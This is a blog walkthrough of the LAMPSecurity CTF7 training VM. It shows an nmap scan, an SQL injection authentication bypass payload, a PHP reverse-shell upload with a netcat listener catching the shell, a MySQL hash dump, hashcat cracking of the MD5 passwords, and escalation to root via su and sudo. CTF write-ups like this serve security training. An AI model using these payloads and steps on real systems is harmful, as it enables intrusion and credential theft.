---
layout: blog_item
title:  "LAMP Security CTF7 - Walkthrough"
date:   2014-04-02 20:00:30
author: Arr0way
description: 'LAMP Security CTF 7 - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.

**Author:** madirish2600

**Download:** [VulnHub](https://www.vulnhub.com/)


## Enumeration

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.134

{% endhighlight %}

<div class="note info">
  <h5>Dislcaimer: Multiple Entry Points</h5>
  <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p>
</div>

### Host Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 5.3 (protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.15 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 139</code></p></pc>
           </td>
           <td>
              <pc><p>Samba</p></pc>
           </td>
           <td>
               <pc><p>Samba smbd 3.X (workgroup: MYGROUP)</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 901</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Samba SWAT administration server</p></pc>
           </td>
        </tr>
        <tr>
          <td>
               <pc><p><code>TCP: 8080</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.15 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 10000</code></p></pc>
           </td>
           <td>
              <pc><p>Webmin</p></pc>
           </td>
           <td>
               <pc><p>(Webmin httpd)</p></pc>
           </td>
        </tr>

     </tbody>

</table>
</div>

## Web Application Enumeration

Host enumeration discovered two web application, one on port <code>80</code> and one on port
<code>8080</code>, as with the previous CTF series VM's, other entry points are
ignored and the **web application** is used for the entry point.

## Web Application on Port 8080

Inspection of the web application revealed it's vulnerable to an SQLi
authentication bypass. By Entering <code>' or 1=1 -- .</code> in the username
field an attacker can successfully login as admin.

![SQL Injection Auth Bypass](/img/blog/ctf7/sqli.png)

Admin account:

![Admin Account SQLi](/img/blog/ctf7/admin-login.png)

### PHP Shell Upload

With admin access to the web application it was possible to upload a reverse
shell.

![Reverse PHP Shell](/img/blog/ctf7/upload-shell.png)

Execution of the php shell was not possible via the web application directly.

### Dirbuster

Dirbuster disclosed the location of the file uploads directory
<code>/assets/</code>.

![OWASP Dirbuster](/img/blog/ctf7/dirbuster.png)

### Reverse Shell

![Execute Reverse Shell](/img/blog/ctf7/exec-webshell.png)

Executing the php script resulted in a reverse shell as the user apache:

{% highlight bash %}
[root:~]# nc -n -v -l -p 443
listening on [any] 443 ...
connect to [192.168.221.134] from (UNKNOWN) [192.168.221.133] 58599
Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC
2012 i686 i686 i386 GNU/Linux
01:12:47 up  2:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-4.1$
{% endhighlight %}

## Local Enumeration

Local enumeration discovered mysql root account could be accessed locally
without a password:

{% highlight bash %}
mysql -u root  and no password worked as the apache user.
{% endhighlight %}

### MySQL

{% highlight bash %}
mysql> select username, password from users;
select username, password from users;
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
| username
| password                         |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
| brian@localhost.localdomain
| 4cb9c8a8048fd02294477fcb1a41191a |
| john@localhost.localdomain
| 0d9ff2a4396d6939f80ffe09b1280ee1 |
| alice@localhost.localdomain
| 2146bf95e8929874fc63d54f50f1d2e3 |
| ruby@localhost.localdomain
| 9f80ec37f8313728ef3e2f218c79aa23 |
| leon@localhost.localdomain
| 5d93ceb70e2bf5daa84ec3d0cd2c731a |
| julia@localhost.localdomain
| ed2539fe892d2c52c42a440354e8e3d5 |
| michael@localhost.localdomain
| 9c42a1346e333a770904b2a2b37fa7d3 |
| bruce@localhost.localdomain
| 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
| neil@localhost.localdomain
| 4773408d5358875b3764db552a29ca61 |
{% endhighlight %}

### Hashcat md5 cracking

The hashes were placed in a text file using the following format:

{% highlight bash %}
brian@localhost.localdomain:4cb9c8a8048fd02294477fcb1a41191a
john@localhost.localdomain:0d9ff2a4396d6939f80ffe09b1280ee1
alice@localhost.localdomain:2146bf95e8929874fc63d54f50f1d2e3
ruby@localhost.localdomain:9f80ec37f8313728ef3e2f218c79aa23
leon@localhost.localdomain:5d93ceb70e2bf5daa84ec3d0cd2c731a
julia@localhost.localdomain:ed2539fe892d2c52c42a440354e8e3d5
michael@localhost.localdomai:9c42a1346e333a770904b2a2b37fa7d3
bruce@localhost.localdomai:3a24d81c2b9d0d9aaf2f10c6c9757d4e
neil@localhost.localdomain:4773408d5358875b3764db552a29ca61
charles@localhost.localdomai:b2a97bcecbd9336b98d59d9324dae5cf
{% endhighlight %}

NOTE: In order for hashcat to ignore usernames in a hash input file you need to
specify <code>--username </code>

{% highlight bash %}
[root:~]# hashcat --username -m 0 -a 0 crack-ctf7.txt
/usr/share/wordlists/rockyou.txt
{% endhighlight %}

#### Cracked MD5 Hashes

{% highlight bash %}
ed2539fe892d2c52c42a440354e8e3d5:madrid
4cb9c8a8048fd02294477fcb1a41191a:changeme
5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234
2146bf95e8929874fc63d54f50f1d2e3:turtles77
9c42a1346e333a770904b2a2b37fa7d3:somepassword
b2a97bcecbd9336b98d59d9324dae5cf:chuck33
{% endhighlight %}

## Local Privilege Escalation

The julia account was able to <code>su</code> to root.

{% highlight bash %}
bash-4.1$ su - julia
su - julia
Password: madrid

[julia@localhost ~]$ sudo -s
sudo -s
[sudo] password for julia: madrid

[root@localhost julia]# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
[root@localhost julia]#
{% endhighlight %}

Thanks for the VM :)
